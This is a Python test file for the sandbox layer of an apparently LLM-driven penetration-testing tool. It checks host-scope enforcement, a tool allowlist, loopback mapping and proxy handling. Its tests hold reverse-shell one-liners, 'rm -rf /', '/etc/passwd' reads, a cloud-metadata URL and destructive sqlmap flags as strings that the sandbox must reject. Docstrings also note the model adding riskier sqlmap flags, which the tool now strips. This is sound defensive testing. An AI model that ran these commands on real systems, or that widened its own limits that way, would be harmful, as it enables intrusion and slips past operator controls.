"""沙箱执行层测试：作用域强制、工具白名单、宿主地址映射、能力探测。

这一层是"让 LLM 用真工具"的边界，出错的后果是**打到白名单外的目标**，
所以每个约束都单独测。测试不依赖 Docker/WSL 是否存在：
不可用时只验证"如实报不可用"，可用时验证探测结果形状。
"""
from __future__ import annotations

import os
import sys
import unittest
from pathlib import Path
from typing import Any
from unittest.mock import patch

SRC = Path(__file__).resolve().parents[1] / "src"
sys.path.insert(0, str(SRC))

from hexhound.sandbox import (  # noqa: E402
    TOOL_ALLOWLIST,
    ExecResult,
    Runtime,
    Sandbox,
    ScopeViolation,
    _clip,
    _dedupe_sqlmap_flags,
    _quote,
    detect_runtime,
    sandbox_report,
)


def make_sandbox(**kwargs) -> Sandbox:
    params = {"allowed_hosts": frozenset({"target.com", "127.0.0.1", "localhost"}),
              "map_loopback": False}
    params.update(kwargs)
    return Sandbox(**params)


class ProxyDisciplineTests(unittest.TestCase):
    """目标流量默认**直连**：系统代理会把整轮扫描打成 502。

    实测事故：本机 Windows 注册表里配了系统代理 `http://127.0.0.1:7892`
    （环境变量为空），httpx 的 `trust_env=True` 会通过 `getproxies()` 读到它，
    于是所有目标请求都返回 502：
        httpx trust_env=True  -> 502
        httpx trust_env=False -> 200
    表现为"目标全挂"，子代理只能退回沙箱里的 curl，步数被烧光。
    """

    def test_send_disables_env_proxy_by_default(self) -> None:
        from hexhound.tools import _proxy_kwargs

        with patch.dict(os.environ, {}, clear=False):
            os.environ.pop("HEXHOUND_HTTP_PROXY", None)
            kwargs = _proxy_kwargs()
        self.assertFalse(kwargs["trust_env"])
        self.assertNotIn("proxy", kwargs)

    def test_explicit_proxy_is_honoured(self) -> None:
        from hexhound.tools import _proxy_kwargs

        with patch.dict(os.environ, {"HEXHOUND_HTTP_PROXY": "http://127.0.0.1:8080"}):
            kwargs = _proxy_kwargs()
        self.assertEqual(kwargs["proxy"], "http://127.0.0.1:8080")
        # 即便显式配置，也不让 httpx 再去读系统代理
        self.assertFalse(kwargs["trust_env"])

    def test_send_passes_proxy_kwargs_to_httpx(self) -> None:
        """接线检查：_send 必须真的把这两个参数传给 httpx.request。"""
        import httpx

        from hexhound.tools import _send

        captured: dict[str, Any] = {}

        class FakeCtx:
            timeout = 5
            rate_limit = 0.0
            _last_request = 0.0

            def throttle(self) -> None:
                return None

        def fake_request(**kwargs):
            captured.update(kwargs)
            raise httpx.ConnectError("stop here")

        with patch.object(httpx, "request", side_effect=fake_request):
            _send(FakeCtx(), "GET", "http://127.0.0.1:5000/")
        self.assertIn("trust_env", captured)
        self.assertFalse(captured["trust_env"])


class ScopeEnforcementTests(unittest.TestCase):
    """作用域强制是本模块存在的理由：命令里出现白名单外主机必须拒绝。"""

    def setUp(self) -> None:
        self.sandbox = make_sandbox()

    def test_allows_allowlisted_url(self) -> None:
        self.sandbox.check_scope("sqlmap -u http://target.com/x?id=1")

    def test_allows_allowlisted_bare_host(self) -> None:
        self.sandbox.check_scope("nmap -sV -Pn target.com")

    def test_rejects_foreign_domain(self) -> None:
        with self.assertRaises(ScopeViolation) as ctx:
            self.sandbox.check_scope("nmap -sV -Pn evil.com")
        self.assertIn("evil.com", str(ctx.exception))

    def test_rejects_foreign_bare_ipv4(self) -> None:
        """回归：早期版本只认域名，`nmap 8.8.8.8` 能绕过作用域检查。"""
        with self.assertRaises(ScopeViolation) as ctx:
            self.sandbox.check_scope("nmap -sV -Pn 8.8.8.8")
        self.assertIn("8.8.8.8", str(ctx.exception))

    def test_rejects_cloud_metadata_ip(self) -> None:
        """SSRF 里最经典的 169.254.169.254 必须被拦（它是权限提升的跳板）。"""
        with self.assertRaises(ScopeViolation):
            self.sandbox.check_scope("curl http://169.254.169.254/latest/meta-data/")
        with self.assertRaises(ScopeViolation):
            self.sandbox.check_scope("nmap -Pn 169.254.169.254")

    def test_rejects_allowlisted_url_with_foreign_redirect_target(self) -> None:
        """命令里同时出现白名单内与白名单外主机时，整体拒绝。"""
        with self.assertRaises(ScopeViolation):
            self.sandbox.check_scope("curl -L http://target.com/ http://evil.com/")

    def test_rejects_ipv6_outside_allowlist(self) -> None:
        with self.assertRaises(ScopeViolation):
            self.sandbox.check_scope("nmap -Pn [2001:4860:4860::8888]")

    def test_empty_allowlist_refuses_everything(self) -> None:
        sandbox = Sandbox(allowed_hosts=frozenset(), map_loopback=False)
        with self.assertRaises(ScopeViolation):
            sandbox.check_scope("nmap target.com")

    def test_ignores_output_filenames(self) -> None:
        """`--output=result.txt` 里的 .txt 不是主机，不能误判。"""
        self.sandbox.check_scope("nmap -sV -Pn -oN result.txt target.com")

    def test_non_tool_command_skips_bare_host_scan(self) -> None:
        """非白名单工具不会走到这里（check_tool 先拒），此处只保证不误报。"""
        self.sandbox.check_scope("python3 -c pass")

    def test_python3_dotted_identifiers_are_not_hosts(self) -> None:
        """回归：`urllib.request` / `out.append` 这类点号标识符曾被当成白名单外主机。

        实测踩过——模型改用 `python3 -c` 写并发脚本时，整条命令被作用域检查拒掉
        （报"白名单外的主机：urllib.request、out.append"），于是它只能退回 curl，
        连并发都打不出来。python3 命令只按 URL 与裸 IP 判定作用域。
        """
        self.sandbox.check_scope(
            'python3 -c "import urllib.request, json; '
            "out=[]; out.append(urllib.request.urlopen('http://127.0.0.1:5000/wallet'))\""
        )
        self.sandbox.check_scope('python3 -c "import socket; socket.gethostname()"')

    def test_python3_still_rejects_foreign_ip_and_url(self) -> None:
        """放宽点号标识符不等于放宽作用域：URL 与裸 IP 照旧拦。"""
        with self.assertRaises(ScopeViolation):
            self.sandbox.check_scope('python3 -c "import socket; socket.create_connection((\'8.8.8.8\', 80))"')
        with self.assertRaises(ScopeViolation):
            self.sandbox.check_scope('python3 -c "import urllib.request; urllib.request.urlopen(\'http://evil.com\')"')


class ToolAllowlistTests(unittest.TestCase):
    def setUp(self) -> None:
        self.sandbox = make_sandbox()

    def test_allows_each_allowlisted_tool(self) -> None:
        for tool in TOOL_ALLOWLIST:
            self.sandbox.check_tool(f"{tool} --version")

    def test_rejects_shell_metacharacter_commands(self) -> None:
        for command in ("rm -rf /", "bash -i", "sh -c id", "cat /etc/passwd",
                        "echo hi", "chmod 777 /tmp/x"):
            with self.assertRaises(ValueError, msg=command):
                self.sandbox.check_tool(command)

    def test_rejects_destructive_sqlmap_flags(self) -> None:
        for flag in ("--os-shell", "--os-pwn", "--file-write", "--priv-esc"):
            with self.assertRaises(ValueError, msg=flag):
                self.sandbox.check_tool(f"sqlmap -u http://t.com --batch {flag}")

    def test_rejects_reverse_shell_patterns(self) -> None:
        for command in (
            'curl http://t.com/ && nc -e /bin/sh 1.2.3.4 4444',
            'curl http://t.com/; bash -i >& /dev/tcp/1.2.3.4/1 0>&1',
            'curl http://t.com/ | mkfifo /tmp/f',
        ):
            with self.assertRaises(ValueError, msg=command):
                self.sandbox.check_tool(command)

    def test_rejects_sql_write_statements(self) -> None:
        for command in ("sqlmap -u http://t.com --sql-query \"DROP TABLE users\"",
                        "sqlmap -u http://t.com --sql-query \"DELETE FROM users\""):
            with self.assertRaises(ValueError, msg=command):
                self.sandbox.check_tool(command)

    def test_allows_normal_readonly_sqlmap(self) -> None:
        self.sandbox.check_tool(
            "sqlmap -u http://t.com/x?id=1 --batch --level=2 --risk=1 --banner"
        )

    def test_empty_command_rejected(self) -> None:
        with self.assertRaises(ValueError):
            self.sandbox.check_tool("   ")


class LoopbackMappingTests(unittest.TestCase):
    """容器/WSL 是独立网络命名空间：靶场在宿主时，127.0.0.1 必须改写成宿主地址。"""

    def test_mapping_enabled_rewrites_loopback(self) -> None:
        sandbox = make_sandbox(map_loopback=True)
        with patch.object(Sandbox, "host_gateway", return_value="192.168.160.1"):
            self.assertEqual(
                sandbox.resolve_command("nmap -sV 127.0.0.1"), "nmap -sV 192.168.160.1"
            )
            self.assertEqual(
                sandbox.resolve_url("http://127.0.0.1:5000/api/users"),
                "http://192.168.160.1:5000/api/users",
            )

    def test_mapping_disabled_leaves_command_untouched(self) -> None:
        sandbox = make_sandbox(map_loopback=False)
        self.assertEqual(sandbox.resolve_command("nmap -sV 127.0.0.1"), "nmap -sV 127.0.0.1")
        self.assertEqual(
            sandbox.resolve_url("http://127.0.0.1:5000/x"), "http://127.0.0.1:5000/x"
        )

    def test_non_loopback_hosts_are_never_rewritten(self) -> None:
        sandbox = make_sandbox(map_loopback=True)
        with patch.object(Sandbox, "host_gateway", return_value="192.168.160.1"):
            self.assertEqual(
                sandbox.resolve_url("http://target.com/x"), "http://target.com/x"
            )

    def test_scope_check_runs_before_mapping(self) -> None:
        """作用域必须按用户声明的目标判定：映射发生在校验之后。"""
        sandbox = make_sandbox(map_loopback=True)
        # 127.0.0.1 在白名单里 → 校验通过；如果先映射，就会拿宿主 IP 去比对而误判
        sandbox.check_scope("nmap -sV -Pn 127.0.0.1")

    def test_host_gateway_rejects_garbage(self) -> None:
        """回归：探测命令被拆坏时返回整行路由输出，不能被当成主机名。"""
        sandbox = make_sandbox(map_loopback=True)
        sandbox._runtime = Runtime("wsl", "wsl.exe", distro="Ubuntu-24.04")

        def fake_exec(command, *args, **kwargs):
            class P:
                returncode = 0
                stdout = "default via 192.168.160.1 dev eth0 proto kernel\n"
                stderr = ""
            return P()

        with patch.object(Sandbox, "_wsl_exec", fake_exec):
            gateway = sandbox.host_gateway()
        # 整行路由输出不是地址 → 必须回退到默认值，而不是把 "default via ..." 当主机
        self.assertNotIn("default", gateway)
        self.assertNotIn(" ", gateway)
        self.assertEqual(gateway, "host.docker.internal")


class ReportTests(unittest.TestCase):
    def test_report_without_sandbox(self) -> None:
        report = sandbox_report(None)
        self.assertFalse(report["enabled"])
        self.assertIn("reason", report)

    def test_report_for_unavailable_sandbox(self) -> None:
        sandbox = make_sandbox()
        with patch.object(Sandbox, "available", return_value=False), patch.object(
            Sandbox, "probe", return_value={"ok": False, "reason": "测试原因"}
        ):
            report = sandbox_report(sandbox)
        self.assertFalse(report["enabled"])
        self.assertEqual(report["reason"], "测试原因")

    def test_report_shape_when_enabled(self) -> None:
        sandbox = make_sandbox()
        with patch.object(
            Sandbox,
            "probe",
            return_value={
                "ok": True, "runtime": "WSL (Ubuntu-24.04)", "kind": "wsl",
                "tools": {"nmap": True, "sqlmap": True, "ffuf": False},
            },
        ):
            report = sandbox_report(sandbox)
        self.assertTrue(report["enabled"])
        self.assertEqual(sorted(report["tools"]), ["nmap", "sqlmap"])
        self.assertIn("allowed_hosts", report)


class DetectionTests(unittest.TestCase):
    def test_detect_runtime_returns_none_or_runtime(self) -> None:
        runtime = detect_runtime()
        if runtime is not None:
            self.assertIn(runtime.kind, ("docker", "podman", "wsl"))
            self.assertTrue(runtime.describe())

    def test_unavailable_sandbox_reports_reason_not_exception(self) -> None:
        sandbox = Sandbox(allowed_hosts=frozenset({"t.com"}))
        with patch("hexhound.sandbox.detect_runtime", return_value=None):
            sandbox._runtime = None
            sandbox._probe = None
            self.assertFalse(sandbox.available())
            probe = sandbox.probe()
            self.assertFalse(probe["ok"])
            self.assertIn("执行环境", probe["reason"])
            self.assertIn("hint", probe)

    def test_run_without_environment_returns_error_result(self) -> None:
        """没有执行环境时，run() 要返回带 error 的结果，而不是抛异常。"""
        sandbox = Sandbox(allowed_hosts=frozenset({"t.com"}), map_loopback=False)
        with patch("hexhound.sandbox.detect_runtime", return_value=None):
            sandbox._runtime = None
            sandbox._probe = None
            result = sandbox.run("nmap -sV t.com")
        self.assertFalse(result.ok)
        self.assertTrue(result.error)
        self.assertTrue(result.exec_id)


class HelperTests(unittest.TestCase):
    def test_quote_escapes_single_quotes(self) -> None:
        self.assertEqual(_quote("a'b"), "'a'\"'\"'b'")

    def test_locked_sqlmap_flags_cannot_be_overridden(self) -> None:
        """回归：模型会在 extra 里自加 --risk=2/--level=3，必须被去重挡掉。

        sqlmap 取"后者胜"，如果不去重，封装声明的"只读轻量"就被悄悄绕过了。
        """
        command = (
            "sqlmap -u 'http://t.com/x?id=1' --batch --level=2 --risk=1 --threads=2 "
            "--timeout=15 --data=\"a=1\" --data=\"a=1\" --banner --level=3 --risk=2 --threads=8"
        )
        cleaned = _dedupe_sqlmap_flags(command)
        self.assertIn("--level=2", cleaned)
        self.assertNotIn("--level=3", cleaned)
        self.assertIn("--risk=1", cleaned)
        self.assertNotIn("--risk=2", cleaned)
        self.assertIn("--threads=2", cleaned)
        self.assertNotIn("--threads=8", cleaned)
        # 非锁定参数原样保留
        self.assertIn("--banner", cleaned)

    def test_dedupe_keeps_first_occurrence_order(self) -> None:
        cleaned = _dedupe_sqlmap_flags("sqlmap --risk=1 -u x --risk=2 --banner")
        self.assertEqual(cleaned, "sqlmap --risk=1 -u x --banner")

    def test_clip_keeps_head_and_tail(self) -> None:
        text = "A" * 500 + "B" * 500
        clipped, was_clipped = _clip(text, limit=200)
        self.assertTrue(was_clipped)
        self.assertIn("省略", clipped)
        self.assertTrue(clipped.startswith("A"))
        self.assertTrue(clipped.endswith("B"))

    def test_clip_leaves_short_text(self) -> None:
        clipped, was_clipped = _clip("short", limit=200)
        self.assertFalse(was_clipped)
        self.assertEqual(clipped, "short")

    def test_exec_result_output_merges_streams(self) -> None:
        result = ExecResult(ok=True, stdout="out", stderr="err")
        self.assertIn("out", result.output)
        self.assertIn("err", result.output)


if __name__ == "__main__":
    unittest.main()
